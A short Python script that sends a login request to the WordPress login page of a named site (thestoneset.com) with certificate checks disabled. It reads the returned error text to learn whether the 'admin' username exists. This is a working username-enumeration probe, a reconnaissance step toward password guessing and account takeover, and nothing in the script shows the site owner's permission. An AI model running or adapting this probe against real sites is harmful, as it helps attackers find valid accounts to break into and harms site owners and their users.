import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Test WordPress Login endpoint
url = "https://thestoneset.com/wp-login.php"
data = {
    'log': 'admin',
    'pwd': 'fake_password',
    'wp-submit': 'Log In'
}

try:
    r = requests.post(url, data=data, verify=False)
    if "The password you entered for the username" in r.text or "<strong>Error:</strong> The password" in r.text or "is incorrect." in r.text:
        print("USERNAME_EXISTS")
    elif "Unknown email address" in r.text or "Unknown username" in r.text or "Invalid username" in r.text:
        print("USERNAME_DOES_NOT_EXIST")
    else:
        print("UNKNOWN_ERROR")
        # print excerpt
        print(r.text[r.text.find('<div id="login_error"'):r.text.find('<div id="login_error"')+200])
except Exception as e:
    print(e)
